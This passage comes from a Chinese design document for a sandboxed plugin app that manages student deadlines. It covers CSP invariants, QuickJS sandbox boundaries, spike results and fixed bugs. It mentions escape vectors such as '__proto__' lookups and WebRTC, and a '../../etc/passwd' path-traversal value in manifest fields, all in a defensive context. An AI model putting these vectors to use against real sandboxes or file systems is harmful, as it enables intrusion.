| 隐式网络出口 | 远程图片由核心代理为 `blob:`；`img-src` 仅 `self data: blob:`；`worker-src 'none'` 禁 Service Worker；UI 禁用 `dangerouslySetInnerHTML`；插件富文本走宿主渲染的受限 AST（非 HTML 字符串） |
| 跨层数据 | 见 I3：只传宿主新构造的对象，只含 schema 声明字段；禁止对不可信数据用 `Object.assign` 或递归合并（会触发 `__proto__` setter） |
| 凭证 | 插件只拿句柄；凭证存 Keystore / Keychain / DPAPI；插件进程内无法枚举。D8 后结构上不可能接触 —— 沙箱内没有异步 API，凭证无从取用 |
| 本地加密 | SQLCipher（移动端，已确认为 `net.zetetic:sqlcipher-android:4.17.0`）；`better-sqlite3-multiple-ciphers`（桌面）；密钥在安全存储 |
| 插件签名 | Ed25519 over `sha256(manifest ‖ bundle)`；官方市场公钥内置；侧载允许但标记 `trust: user` 并在 UI 上持续提示 |
| 审计 | `audit_log` 记录所有敏感 RPC（net / auth / fs / notify）；提供用户可读的「插件活动」页面 |
| 数据主体权利 | 一键导出（JSON/SQLite 副本）、一键清除、按插件删除数据 |
| 合规 | 默认本地处理；连接器首次启用明确告知 ToS 风险；未成年人场景禁用云同步 |

**残留风险（诚实说明）**：连接器插件拿到的是**用户自己的会话**，因此它能读到用户能看到的一切。这不是技术缺陷而是模型固有属性，只能靠「连接器需审核 + 用户逐连接器授权 + 审计可见」来管理。

#### 11.1 P0 实证新增的架构不变量（必须由 CI 守护）

| # | 不变量 | 理由与守护方式 |
|---|---|---|
| **I7** | `plugins.CapacitorHttp.enabled` **永远为 `false`** | 一旦打开，`window.fetch`/`XHR` 被补丁成走原生 HTTP，**原生 HTTP 不受 WebView CSP 约束**，`connect-src 'none'` 当场失效。CI 断言 `capacitor.config.*` |
| **I8** | 渲染层与沙箱内都不得存在 `RTCPeerConnection` / `RTCDataChannel` | WebRTC 是 CSP 盲区（不受 `connect-src` 约束）。沙箱内 QuickJS 无此内建（已验证），渲染层需显式删除。CI 静态扫描 |
| **I9** | 沙箱 bootstrap 显式删除 `eval`、`SharedArrayBuffer` | 两者在 QuickJS 里**确实存在**（P0-S4 实测）。当前作用域内无宿主对象可取，但按最小权限原则应删除 |
| **I10** | 原生桥只暴露**一个窄入口**，授权靠**每次调用携带的能力令牌**，不靠 frame 来源 | Android 的 `addJavascriptInterface` 把桥注入 WebView 的**所有 frame**（含不透明源 iframe），因此 iframe **不是**对原生桥的隔离边界。iframe 永远拿不到长期令牌 |
| **I11** | 所有「按名字查表」用 `Object.hasOwn` / `Map`，禁止裸 `obj[key]` 真值判断 | P0-S1 实测：`fields['__proto__']` 返回 `Object.prototype`（真值），`['constructor']` 返回 `Function`，朴素白名单被直接绕过 |

> **注（P0-S2 已给出结论）**：Capacitor 的 bridge 不是网络请求 —— `@capacitor/core` 的 JS 产物里
> `XMLHttpRequest` / `WebSocket` / `sendBeacon` / `EventSource` **零命中**，分发走
> `nativePromise`/`nativeCallback` → `androidBridge`（`@JavascriptInterface`）/
> `webkit.messageHandlers.bridge`。因此 `connect-src 'none'` **成立**，前提是 I7 保持成立。
> 完整证据链见 `spikes/p0/REPORT.md` §2。

---

## 12. 构建、打包、插件开发流

- **宿主 UI**：Vite + React + TS。`pnpm dev` 起 web 适配器版本，浏览器里全功能调试。
- **插件打包**：esbuild → IIFE 单文件，无外部依赖（`ctx` 由宿主注入），产 `.mtp`（zip：`manifest.json` + `bundle.js` + `assets/` + `signature`）。
- **插件开发**：`matrix plugin dev` 起 ws 服务 + watch 重建，宿主在 `--dev` 模式下从 `http://127.0.0.1:5174` 热加载（仅 dev 模式允许远程加载）。
- **移动端**：`pnpm build && npx cap sync android && ./gradlew assembleRelease`。预期 APK 15–30MB（WebView 由系统提供）。需 Node 22+、Android minSdk 24 / compile+target 36、Android Studio 2025.2.1+。
- **桌面端**：electron-builder，NSIS 安装包，预期 90–150MB。若体积成为问题，可评估 Tauri 替代（代价是 WebView 一致性：Windows 上 WebView2 需运行时）。
- **CI**：typecheck → lint（含依赖边界规则）→ 单元测试 → 适配器一致性测试 → 沙箱逃逸测试 → 构建 → 签名。
- **依赖锁定**：附录 A 的版本在 `pnpm-lock.yaml` 中锁定；原生依赖（Capacitor 插件、better-sqlite3）升级需单独走一轮真机回归，不能随常规依赖一起浮动。

### 必须存在的测试

1. **适配器一致性套件**：同一组用例跑 capacitor / electron / web 三个实现。
2. **沙箱逃逸套件**：在 QuickJS 里尝试 `Function` 构造、动态 import、原型链、`__proto__` 污染、越权 RPC、超配额，全部必须失败（用例清单见 [`sandbox-sketch.ts`](./sandbox-sketch.ts) 末尾）。
3. **迁移套件**：升级 → 降级 → 中途中断，验证幂等与可回滚。
4. **连接器 fixture 测试**：离线 HTML/JSON 快照，平台改版时用真实快照快速定位。
5. **去重属性测试**：随机生成近似 DDL，验证不会重复也误合。

> 已完成的先行验证：`schema.sql` 已在真实 SQLite 3.37 上跑通 —— 建表/索引齐全、脚本可重复执行、唯一索引与 CHECK 生效、JSON generated column 的查询**命中了索引**（非全表扫描）。校验脚本：[`verify-schema.py`](./verify-schema.py)。
> `api-v1.d.ts` 已通过 `tsc --strict` 类型检查。

---

## 13. 路线图

### P0 —— 跑通架构（4–6 周）

**先做三个技术验证 spike —— 已执行完毕，结论见 `spikes/p0/REPORT.md`：**

| # | Spike | 结论 | 退路状态 |
|---|---|---|---|
| S1 | `@capacitor-community/sqlite@8.1.1` 在 Android 上是否支持 **generated columns / 表达式索引 / 部分索引** | ✅ **真机已确认**。23 条断言通过；查询 DSL 编译器全参数化、9 类注入/越界全拒、命中索引。**真机自检中 `indexing.generated-columns` 探测通过并被选中**（Android 16 / API 36） | 退路仍保留但已无必要：「影子索引表 + 触发器」与主方案在 5 组查询上结果完全一致且同样命中索引 |
| S2 | 核心下沉原生层后，WebView 能否把 CSP 收紧到 `connect-src 'none'` | ✅ **真机已确认，且强于预期**。10 条静态断言通过；`@capacitor/core` JS 产物零网络 API，桥接走 `nativePromise`/`nativeCallback`。**更强的证据：移除 `INTERNET` 权限的构建（`matrix-nonet.apk`）在真机上正常运行** —— 应用在系统层面无权发起任何网络请求，功能不受影响 | 无需退路。硬约束 I7（`CapacitorHttp` 永不开）、I10（能力令牌）、外域资源 CSP 收口 继续有效 |
| S3 | SQLCipher 密钥在 Android Keystore 中的存取链路（含首次生成、备份/迁移、卸载重装） | ✅ **真机已确认（最理想实现直接成立）**。`kv.secure-storage` 探测通过并被选中，走 Android Keystore；`store.sqlcipher` 亦通过（`PRAGMA cipher_version` 非空，加密真实生效） | **原退路「用户口令派生密钥」可以删除**。降级链（Preferences → localStorage + UI 告警）仍保留作为防御，但不再是设计前提 |
| S4 | QuickJS 沙箱边界与逃逸面（**本轮新增**） | ✅ 边界真实（12 条断言）。沙箱 `globalThis` 只有纯 ECMAScript 内建，`fetch`/`process`/`require`/`document`/`WebAssembly` 全部 `undefined`，`Function` 构造器也取不回宿主能力 | — |
| S4-异步 | 插件侧 `await` 宿主 RPC（**本轮新增，结论为证伪**） | ❌ **证伪**。顺序 await 第二次宿主调用必崩；asyncify 状态是 WASM 模块实例级全局状态，一处损坏全局连坐 | ✅ **替代方案已实证**（S4b，10/10）：插件改为**纯函数**，沙箱内无异步宿主 API，宿主代跑 IO。见 D8 / D9 / §5.5 |

> **S4-异步 是本轮最重要的发现**：它推翻了原 §5.5 的 RPC 协议，并促成了 D8（纯函数化）
> 与 D9（一个插件 VM 独占一个 WASM 模块实例）。这个改动降低了复杂度而非提高 ——
> 插件变成可单测的纯函数，整类 asyncify 风险消失。

**正式内容：**
- monorepo、kernel、`web` + `capacitor` 适配器、数据层 + 迁移。
- **原生 `CorePlugin` 骨架**（`net` / `vault` / `db` 三个方法族 + 权威权限校验）+ JS 侧 `core-client`。
- **三份 CSP 落地**：主 WebView / 插件 iframe（srcdoc meta）/ 静态页。
- Timeline 作为 **first-party 插件**（手动添加 DDL 与课程）。
- 两种预设布局可切换；主题色可调。
- **验收**：装 APK → 飞行模式 → 添加 5 条 DDL 与 3 门课 → 重启数据仍在 → 布局切换生效。全程零网络权限。
- **附带验收**：S1 的三个 SQL 特性有明确结论并写回本文档。✅ 已完成（S1b）
- **新增验收**：CI 守护 I7–I11 五条不变量。

### 13.1 最小可运行 APK（已产出）

在正式 P0 之前先做了一个**可装机的切片**，用于把「纸面结论」变成「设备结论」。
代码在 `apps/shell`，构建脚本 `tools/build-apk.ps1`，使用说明 `docs/APK-测试指南.md`。

| 项 | 状态 |
|---|---|
| 应用 ID / SDK | `dev.matrix.shell`，minSdk 24，targetSdk 36 |
| 体积 | 13.03 MB（含 4 个 ABI 的 `libsqlcipher.so`） |
| 已含功能 | 时间线（DDL/课程/测验/签到/自定义）、课程管理、主题/密度/布局切换 |
| 未含 | 原生核心层、网络收口、插件系统、微信解析、通知监听 |
| 产物 | `dist-apk/matrix-debug.apk`（常规）、`dist-apk/matrix-nonet.apk`（**无 `INTERNET` 权限**） |

**构建期已从产物核对确认的（非推测）：**

| 断言 | 证据 |
|---|---|
| SQLCipher 确实被链接进 APK | 包内含 `lib/{arm64-v8a,armeabi-v7a,x86,x86_64}/libsqlcipher.so` |
| **架构不变量 I7 成立** | `assets/capacitor.config.json` 中不存在 `plugins` 段 → `CapacitorHttp` 保持默认关闭 |
| CSP 真的进了产物 | 打包的 `assets/public/index.html` 含 `connect-src 'none'` |

**本切片同时是策略层的第一个真实载体**（见 §5.5 / D8）：

- `kv` 槽位：`kv.secure-storage` → `kv.preferences` → `kv.localstorage`
- `indexing` 槽位：`indexing.generated-columns` → `indexing.shadow-table`
- `store` 槽位：`store.sqlcipher` → `store.sqlite` → `store.json`

启动时按 tier 顺序探测，首个通过者胜出；用户可在隐藏调试面板里手动覆盖并即时重新自检。
这样 S1/S2/S3 三项未验证假设**不需要事先赌对** —— 赌错了会当场降级并告警。

> **注意 `probe` 必须拿到上游依赖**：加密库的探针必须用**正式口令**去试，
> 若用随机口令探测，会污染 `@capacitor-community/sqlite` 的全局密钥槽，
> 导致正式数据库被错误口令加密、再也打不开。这个坑已在实现中处理。

**真机实测结果（Android 16 / API 36，已全部确认）：**

| 原待确认项 | 结果 |
|---|---|
| `PRAGMA cipher_version` 是否非空 | ✅ 非空，加密真实生效 |
| Android Keystore 写-读-删往返 | ✅ 成功，`kv.secure-storage` 被选中 |
| 生成列 + 索引是否可用 | ✅ 可用，`indexing.generated-columns` 被选中，未走影子表退路 |
| 三个槽位是否都选中了理想策略 | ✅ 是（`store.sqlcipher` + `kv.secure-storage` + `indexing.generated-columns`） |
| 无 `INTERNET` 权限能否正常运行 | ✅ **能**。`matrix-nonet.apk` 功能完整 —— 这是 S2「零网络」最硬的证据 |
| 核心层真实请求能否发出（v0.4 新增） | ✅ HTTP 200；302 跳转正常，逐跳复检在工作 |
| Set-Cookie 收走并持有（v0.4 新增） | ✅ 持有 1 条，后续请求确实带上 —— 会话注入闭环成立 |
| 审计落盘 + 重启后可见（v0.4 新增） | ✅ 重启后列表与统计都在 |

**真机测试还暴露了 6 个只有实跑才会发现的问题**，均已修复：

1. `mode: 'encryption'` 误用（加密库建不起来）
2. 同 tier 按 id 字母序排序（SQLite 可用却掉到 JSON）
3. 加密库与明文库共用文件名（有写坏数据的风险）
4. 切换后端时的数据迁移缺失
5. `set-cookie` 泄漏给插件（设计要求剥离，实现只做了写回）
6. **审计读回了却不显示** —— 记录进了存储封装自己的缓冲，而面板读的是核心层另一个环形缓冲，两者从未接上

**这六条的共性：纸面推演全都看不出问题。** 第 6 条尤其值得记：纸面上「审计已持久化」是成立的，
但用户看到的是「缓冲 N 条、列表为空」—— **功能存在 ≠ 功能可用**。
这也是「先出最小可跑版再迭代」这个决定的价值所在。

### P1 —— 插件运行时（4–6 周）
- QuickJS 沙箱 + RPC broker + 权限确认页 + 配额 + 审计。
- **信任模型落地**：受限模式、远程代码信任的授予/撤销流程、常驻徽章、`ctx.loadModule()`。
- 沙箱逃逸测试套件必须先于第一个第三方插件完成。
- `importer-ics` 插件（声明式 + 逻辑混合）验证插件 API 是否够用。
- 布局编辑器 + 导出/导入 JSON。
- **验收**：第三方插件安装后只能访问被授权的能力；未声明权限的 RPC 被拒并记审计；未授予信任时 `evalRemote()` 与远程域名请求抛 `ETRUST`；布局 JSON 在另一台设备导入后一致。

### P2 —— 接入一个平台（6–8 周）
- 认证代理 + 网络网关 + 会话管理。
- 选一个连接器落地。**注意：Piazza / Gradescope / 上科大平台均无公开 API**，只能模拟会话；建议选用户日常使用频率最高、登录链路最短的那一个，并把它当作「会坏的东西」来设计。
- DDL 自动同步（幂等 upsert）+ 提交链接跳转 + 课前提醒（含讲义预取）。
- `electron` 适配器 + 桌面壳（复用同一份 dist）。
- **验收**：连接器同步 3 次不产生重复；DDL 主按钮直达提交页；课前提醒能发出（精确或非精确均可，但必须在 UI 上如实标注精度）。

### P3 —— 智能与生态
- 微信/通知解析（分享入口 → 规则 → 本地模型 → 确认卡片）。需先自写 Android `NotificationListenerService`。
- 第二个连接器 + Piazza（非官方 API，做好随时失效的准备）。
- 插件市场、签名校验、组件审核流程。
- **验收**：从分享一条微信消息到 Timeline 出现正确 DDL ≤ 3 次点击。

---

## 14. 风险登记册

| 风险 | 概率/影响 | 缓解 |
|---|---|---|
| 平台改版导致连接器失效 | **高** / 中 | 已核实三大目标平台**均无公开 API**（见附录 A）。连接器独立发版；离线 fixture 契约测试；解析失败时降级为「保留链接、手动确认」；可选匿名失效上报 |
| 沙箱逃逸 | 低 / 高 | QuickJS 真隔离；CSP 兜底；持续维护逃逸测试套件；第三方 UI 走独立源 |
| 信任模型被用户盲点绕过 | 中 / 高 | 默认 A 严格；授予时强制展示来源域名与风险；受限模式徽章常驻；每次信任变更写审计 |
| 渲染内容造成隐式外发 | 中 / 中 | 远程图片由核心代理为 `blob:`；`img-src` 收窄；`worker-src 'none'` 禁 SW；插件富文本走宿主渲染的受限 AST |
| WebRTC 绕过 CSP | 低 / 中 | CSP 无法限制 `RTCPeerConnection`。缓解：信令通道被 CSP 挡住；**根本缓解是第三方 UI 优先用声明式 Schema（宿主渲染），iframe 只作最后手段** |
| 原生核心的双端维护成本 | 中 / 中 | 只有一层薄接口；Web 适配器提供同构 JS 实现，`tools/conformance` 同一套用例跑两边 |
| Android 后台限制导致提醒不准 | **高** / 中 | 三级降级链；**默认按非精确设计**；Android 14+ 需引导授权；产品文案不承诺准点 |
| 微信自动化不可行 | **高** / 中 | 以分享/粘贴为主路径；桌面本地库读取受限于微信版本（已知仅 < 4.0.3.36），标注为实验性 |
| 需自建原生代码 | 中 / 中 | 仅两处（通知监听、精确闹钟）；无现成插件可用，P0 就要确认 Android 侧人力 |
| Capacitor SQLite 不支持 generated column | 中 / 中 | 见 P0 Spike S1 的退路（影子索引表） |
| ToS / 合规风险 | 中 / 高 | 连接器可卸载、默认本地处理、明示风险、数据导出与清除 |
| QuickJS 性能不足（大 HTML 解析） | 中 / 低 | 提供受限的 `ctx.net.parseHtml()` 宿主 API（见 `api-v1.d.ts`），把 cheerio 留在宿主而非沙箱 |
| 包体积 | 低 / 低 | QuickJS wasm 仅 ~0.5MB；移动端可接受；桌面端若超 150MB 评估 Tauri |
| 插件 API 过早定型 | 中 / 中 | P1 用两个真实插件（ICS 导入 + 一个连接器）反向验证 API，再冻结 v1 |

---

## 15. 下一步可交付物

1. ~~把本文的契约草案落成真实工程代码：`packages/plugin-api/src/v1/`（源文件而非 `.d.ts`）…~~
   ✅ **契约与内核已落地**（v0.4，npm workspace 根 + 两个包，见下）。
   `packages/data/src/sql/`（DDL + 迁移）与 `packages/plugin-host/src/sandbox/`（QuickJS 骨架）仍未开始。
2. ~~**原生 `CorePlugin` 骨架**（Kotlin 先行）…~~
   ✅ **已修订为纯 TypeScript**（见 §7.4）：传输层复用 `@capacitor/core` 的 `CapacitorHttp`
   （原生实现，`enabled` 保持 false），策略层（白名单 / 逐跳复检 / 限流 / 审计）全部写在 TS。
   `vault` 复用已验证可用的 `@aparajita/capacitor-secure-storage`，`db` 由查询编译器 + 策略层承担。
   **不需要写任何 Kotlin/Swift**，Web 适配器由框架自带的 `CapacitorHttpPluginWeb` 提供。
   自写原生仅剩「通知监听」，另行排期。
3. ~~**信任模型的存储与流程**：`plugin_registry.trust_level` 状态机、授予/撤销 UI、受限模式徽章…~~
   ✅ **状态机与联动已落地**（`packages/kernel/src/trust.ts` + `apps/shell/src/core/plugin-host.ts`）。
   剩余：授予/撤销 **UI**、受限模式徽章渲染、信任记录的**持久化**（目前是内存态）。
4. `apps/shell` 的 boot 装配骨架 + `web` 适配器，目标是在浏览器里直接跑通 P0 的全部验收项。
   ✅ **装配已完成**：`bootstrap()` 里已接通 `PluginHost`（当前 `modules` 为空 —— 一个插件都没装）。
5. `tools/conformance` 适配器一致性套件（JS 实现 vs 原生实现）+ 沙箱逃逸套件（先于第一个第三方插件完成）。
   ⚠️ 部分达成：**跨包差分测试**已经存在（`apps/shell/src/core/plugin-api-diff.test.ts`），
   但它比的是「两个 TS 包之间」，不是「JS 实现 vs 原生实现」。后者仍未做。
6. 插件 CLI（`create` / `build` / `sign` / `dev`）。
7. ~~P0 三个 spike（S1 / S2 / S3）的验证脚本与结论回写本文档。~~
   ✅ **已完成**：S1/S2/S3 均在真机上确认，结论已回写 §13 与附录 A。
   验证载体是 `apps/shell` 产出的最小可跑 APK（见 §13.1），构建脚本 `tools/build-apk.ps1`。

### 15.1 已落地的契约层与内核层（v0.4）

```
packages/plugin-api/   v1 契约（93 项断言）
  src/v1/errors.ts       两套码空间（见 §5.5）
  src/v1/schema.ts       EntitySchema / FieldSchema / ENTITY_TYPE_RE（manifest 与 DataBus 共用）
  src/v1/manifest.ts     Manifest v1 校验 + 保留命名空间 + contributes 形状
  src/v1/permissions.ts  权限矩阵、域名匹配、RPC 授权
  src/v1/contract.ts     plan / parsers / next 纯函数契约（含 source / entities）
  src/v1/version.ts      版本协商（N-2 支持窗口）
packages/kernel/       内核（78 项断言）
  src/trust.ts           信任状态机（含「只能经 grantRemote 升到 remote-trusted」）
  src/databus.ts         数据总线（命名空间隔离 / UTF-8 配额 / 增量占用）
  src/broker.ts          宿主侧驱动的同步状态机（含本地导入与 plan().entities）
  src/registry.ts        插件注册表与生命周期
  src/bytes.ts           跨边界字节计数（唯一实现）
apps/shell/src/core/
  plugin-host.ts         内核 ↔ 核心层的唯一接缝（含本地文档表）
  plugin-api-diff.test.ts 跨包差分测试（26 项断言）
```

📖 **面向插件作者的 API 参考：[`packages/plugin-api/README.md`](../../packages/plugin-api/README.md)**
（约 870 行，14 节：形态 / Manifest / 权限矩阵 / 契约 / 状态机纪律 / 数据总线 /
错误码 / 版本协商 / 信任与生命周期 / 宿主侧 API / 现状清单 / 测试怎么跑）。

它刻意与包同处，而不是放在 `docs/design/` —— 文档描述的 `CURRENT_API_VERSION`
就是这个包的版本，放在一起才不会脱节。文档里 **已实现 / 提案 / 未实现** 三类内容
分开标注，当前沙箱和 .mtp 安装已实现；验签、`net.stream`、`db.raw`、完整信任持久化仍未实现。

**三条命令**（在仓库根跑）：`npm test`（四个套件）、`npm run typecheck`、`npm run check`。

**差分测试是本轮最有价值的产出之一**，因为它抓到了两个只有跨包才暴露的真实缺陷：

1. `InProcessRuntime` 自报 `kind: 'first-party'`，而注册表**严格**比对 manifest 声明的 kind
   （`registry.ts` 的握手核对）—— 结果所有 `kind: 'connector'` 的第一方插件**都装不上**。
   进程内运行时没有独立知识，只能以 manifest 为准；沙箱运行时才有资格独立报告。
2. 适配器把「任何信任变更」都当成撤销令牌，导致第一方插件登记时（等级 `signed`）
   被永久标成 revoked，`issueToken` 从此抛 `EAUTH` —— **所有第一方插件的网络能力被掐死**。
   这个 bug 不报错，只表现为「请求全都返回 EAUTH」，很难查。
   现在只认「`remote-trusted` → 其它」这一种降级。

两条都补了回归测试。

**单元测试没抓到的两类缺陷**（记下来，因为它们说明测试的盲区在哪）：

- **插件 API 的两处 semver bug**（`~1.2.3` 被实现成 caret 语义、精确版本范围判等写成了 `>=`）——
  是**差分测试**（拿插件 API 的实现去比对核心层 `allowlist.ts` 的独立实现）暴露的，
  不是单元测试。同一份规则有两份实现时，差分测试是唯一能发现漂移的手段。
- **dataBus 的键不含 pluginId**、**字节配额按 UTF-16 码元算** —— 是**读代码**发现的，
  不是任何测试发现的。两条都属于「测试写的时候会顺着实现写」的类型。

### 15.2 第一个第一方插件暴露的缺口（v0.5）

在动手写第一个实验性第一方插件（ICS 课表导入）之前，先把「写它必然会撞上」的契约缺口修掉了。
这些全都属于**测试全绿但插件写不出来**的类型 —— 单元测试不可能发现，因为它们测的是
「已实现的东西对不对」，而这些是「该有的东西有没有」。

| # | 问题 | 处置 |
|---|---|---|
| 1 | **本地导入没有落点**。`PlanInput` 没有承载文档的字段；更根本的是 broker 主循环是 `while (pending.length > 0)` —— `plan()` 返回空请求时循环体一次都不进，`parsers` 与 `next` 永远不被调用。**v1 的同步模型隐含假设「文档必然来自网络」。** | `PlannedRequest.source?: 'net' \| 'host'`。`host` = 宿主自行满足，不出网、不查域名白名单。**不开第二个输入通道** —— 文档仍从 `parsers` 的 `body` 进来，`parsers` 语义完全不变 |
| 2 | **纯计算插件产不出数据**。`bus.emit` 是插件写入的唯一通路，而它挂在请求循环里 → `kind: 'logic'` 且不发请求的插件永远写不进去，且同步返回 `ok`、**静默**什么都不做 | `RequestPlan.entities?` —— 无需 IO 的实体在请求循环**之前**落库 |
| 3 | **`entry` 对 `first-party` 是必填的死字段**。进程内运行时根本不读它，却要求填一个不存在的文件名 | `KINDS_WITHOUT_ENTRY` 加入 `first-party`（语义是「不必须」，不是「禁止」）。**另外**：原实现只在「必填」分支里校验 `entry`，所以 `declarative` 能塞 `../../etc/passwd` 而不被检查 —— 改成「只要给了就校验」 |
| 4 | **保留前缀把官方第一方也拒了**。`dev.matrix.*` / `app.matrix.*` 无条件拒绝，而 §5.2 声称 `app.matrix.*` 合法 —— 文档承诺与实现不一致 | 宿主显式传 `allowReservedPrefix: true`。刻意**不**看 `kind`（那是 manifest 自己声称的东西，第三方照抄即可绕过） |
| 5 | **`contributes` 完全没被校验**。`entityTypes` 是 `unknown[]`，写错要等到 `install` 才以 `ESCHEMA` 冒出来，安装页指不出是哪一条 | `validateContributes()` 校验 `entityTypes` / `commands` / `connectors` 的形状 |
| 6 | **`EntitySchema` 定义在内核里**，导致 manifest 只能把它当 `unknown[]`，`registry.ts` 还得写 `decl.schema as EntitySchema` | 挪到契约包 `src/v1/schema.ts`，内核 `import`。方向也是对的：内核本来就依赖契约包 |

**两处「一份规则两份实现」的隐患顺手收掉了**：`ENTITY_TYPE_RE` 现在由 manifest 校验、
`permissions.data` 校验、`DataBus.declareSchema` 三处共用；`EntitySchema` 只有一份定义。
差分测试新增了「同一批名字在两处校验里判定一致」的断言。

**新增的隔离点**（容易被忽略）：`source: 'host'` 的请求**不过域名白名单**（它不出网），
所以本地文档表**必须**按 `(pluginId, url)` 分键 —— 否则插件 A 能读到插件 B 导入的文件。
这与 §6.5 里 dataBus 记录键的教训是同一个。已补回归测试。

断言数：契约 71 → **92**，内核 69 → **74**，跨包差分 15 → **20**（shell 核心 87 项不变）。

### 15.3 权限闸与游标的补修（v0.5.1）

§15.2 修的是「插件**写不出来**」；这一轮修的是「插件**写得出来、但闸是假的**」。
两条属于同一类问题：**文档承诺了、实现没做、而且没有任何测试会发现** ——
因为测试都是顺着实现写的。

| # | 问题 | 处置 |
|---|---|---|
| 1 | **`validateRequests` 不校验 `source`**。写错的值静默退化成 `'net'`：打在已授权 URL 上**正常发出**（拼写错误无人发现），打在未授权 URL 上以 `ENETDENIED` 报出，把用户指向「域名不在白名单」这个错误方向 | 加一项形状校验 → `ESCHEMA` |
| 2 | **`cursor` 是死字段**。`broker.ts` 全文不出现，`SyncReport` 没有这个键 → `PlanInput.cursor` 永远填不上，分页永远不续上，**而且不报错**。README §1 的示例就在用它 | `SyncReport.cursor`（本轮最后一个非空值）+ 宿主 `Map` 回填。进程内有效，持久化仍是缺口 |
| 3 | **`HOST_CAPABILITIES_V1` 缺 `local.request`**。`RPC_METHODS` 里有、能力清单里没有 → 插件探测拿到 `false`，于是**永远不用**这个能力 | 补上。两份手写清单必须一起改，已加断言锁住 |
| 4 | **`bus.emit` 不查 `data.write`**（`databus.ts` 只查 schema 与配额 —— 它不知道 `granted`）。于是 `net` 路径是真闸、写数据路径是**纸闸**：同一个权限引擎两条路径两个行为 | 宿主 `emitEntity()` 里查 `granted.dataWrite`。**这条最重要** —— 补了之后「权限引擎生效」才不是一句空话 |
| 5 | **`provideLocal` 无大小上限**。50 MB 文件先进内存、再跨边界、最后才被 `maxBodyBytes` 拒 —— 拒是拒了，代价已经付了 | `maxLocalBytes`（默认 8 MiB），当场 `ETOOBIG`；返回值从 `void` 改成 `PluginResult<void>` |

**仍然没做的两条，已写进文档而不是留成暗示**：

- **`bus.read` 的读闸**。`data.read` 同样没被检查，但现在补不了 —— 唯一调用方是
  shell 自己的 Timeline 视图，它没有插件身份，一加闸就把现有功能掐死。
  等 Timeline 真变成插件（拿到 `dev.matrix.timeline`）时才补得动。
- **`installBuiltin()`**。`allowReservedPrefix` 是裸布尔，任何 `install()` 调用方都能传 true。
  第三方安装路径出现之前必须收成独立入口，让这个开关**在类型上**不可从第三方路径触达。

断言数：契约 92 → **93**，内核 74 → **78**，跨包差分 20 → **26**（shell 核心 87 项不变）。
累计 **284** 项。

---

## 附录 A：依赖版本与已核实事实

设计阶段实际核实过的版本与平台约束（核实日期：设计稿撰写时；**开工前请复核**）。

### 版本

| 依赖 | 版本 | 备注 |
|---|---|---|
| Capacitor | 8（`@capacitor/core` 8.5.3） | 需 Node 22+；Android minSdk 24 / compile+target 36；iOS 部署目标 15.0 |
| `@capacitor-community/sqlite` | 8.1.1 | 原生 SQLCipher 加密 ✅；Electron 端走 `better-sqlite3-multiple-ciphers`；**Web 端不支持加密** |
| `@capacitor/local-notifications` | 8.3.1 | 官方 |
| `@capacitor/background-runner` | 3.0.0 | 官方，需原生配置 |
| `@aparajita/capacitor-secure-storage` | 8.0.1 | Keychain / Keystore |
| `@capgo/capacitor-share-target` | 8.0.62 | 接收 `ACTION_SEND`，需改 intent-filter |
| 通知监听 | —— | **无可用插件**（`capacitor-notificationlistener` 已 deprecated）→ 自写原生 |
| Electron | 44.8.0 | `safeStorage` 在 Windows 使用 DPAPI ✅；`utilityProcess` 已稳定 ✅ |
| `better-sqlite3-multiple-ciphers` | 13.x | 支持 SQLCipher ✅（`node:sqlite` 仍为 RC 且无加密，不选） |
| `quickjs-emscripten` | 0.32.0 | release-sync wasm **503 KB** |

### 平台约束（会直接影响功能承诺）

- **自定义 origin 受限**：Capacitor 允许设 `server.hostname` / `androidScheme` / `iosScheme`，但 iOS 不能设 `http`/`https`（WKWebView 占用），`server.url` 官方标注仅用于 live-reload。**结论：无法为每个插件分配独立 origin，第三方 UI 插件必须走不透明源 iframe（`sandbox="allow-scripts"`，不加 `allow-same-origin`），其 `srcdoc` 内 meta CSP 的 `connect-src` 生效。**
- **精确闹钟**：Android 12 引入 `SCHEDULE_EXACT_ALARM`（预授予、可被撤销）；13 增加 `USE_EXACT_ALARM`（安装即授予，但 Play 政策仅限闹钟/日历类应用）；**14 起对 target 33+ 的新安装默认拒绝**，需 `canScheduleExactAlarms()` + `ACTION_REQUEST_SCHEDULE_EXACT_ALARM` 引导。
- **WorkManager 周期任务最小 15 分钟**，flex 最小 5 分钟。
- **`NotificationListenerService` 必须由用户在系统设置手动开启**，应用无法自行授权。
- **ShadowRealm 至今未在任何浏览器发布**（Chrome 仍为 In development，Firefox/Safari 无信号）→ 不能作为沙箱方案。
- **Web Worker 不是安全边界**：同源限制之外，worker 内可 `fetch` / `WebSocket` / `importScripts`。

### 平台 API 现状

| 平台 | 公开 API | 可用替代 |
|---|---|---|
| Gradescope | 无 | 非官方 `gradescopeapi`（模拟登录） |
| Piazza | 无（`/developers` 已 404） | 非官方 `piazza-api` |
| 上海科技大学 E云课堂 / 互动教学平台 | 未查到任何公开或半公开 API | 只能模拟会话 |

**这意味着连接器层没有稳定契约可依赖**，必须按「随时会坏」来设计（见 §10.2 的置信度分级与 §14 的缓解措施）。

### 仍待验证

**P0 已给出结论的（详见 `spikes/p0/REPORT.md`）：**

1. ~~`@capacitor-community/sqlite` 是否支持 **generated columns / 表达式索引 / 部分索引 / `ATTACH DATABASE` / FTS5**~~
   → ✅ **generated columns + 索引已实证可用**（S1，23 条断言 + 真机确认）。
   `ATTACH` / FTS5 未测，但设计不依赖。退路（影子索引表）也已实证，结果与主方案一致。
2. ~~移动端 WebView 能否把 CSP 收紧到 `connect-src 'none'`~~
   → ✅ **真机已确认**（S2，10 条静态断言 + 设备实测）。前提是 I7（`CapacitorHttp.enabled` 永远 false）。
   最强证据：移除 `INTERNET` 权限的 `matrix-nonet.apk` 功能完整，而真发请求按预期失败（`ENET`）。
3. **新增**：QuickJS 沙箱逃逸面 → ✅ 边界真实（S4，12 条断言）。
4. **新增**：插件侧 `await` 宿主 RPC → ❌ **证伪**，已改为纯函数模型（S4b，10/10）。
5. **新增**：核心层网络网关 + 会话注入 + 审计落库 → ✅ 本机 83 项断言 + **真机确认**
   （HTTP 200、302 逐跳复检、cookie 收走并持有、重启后审计可见）。

**仍未验证（按优先级）：**

| # | 项 | 为什么没验证 | 影响 |
|---|---|---|---|
| 1 | Capacitor 桥接的**安全边界**在真机上是否可被插件绕过 | 需 P1 插件运行时落地后才能实测 | **高** —— 这是整个权限模型的地基 |
| 2 | Android `addJavascriptInterface` 对 iframe 的实际可见性 | 需 P1 运行时可注入 iframe | 中 —— 已按「可能可见」设计（I10 能力令牌），故为防御性冗余 |
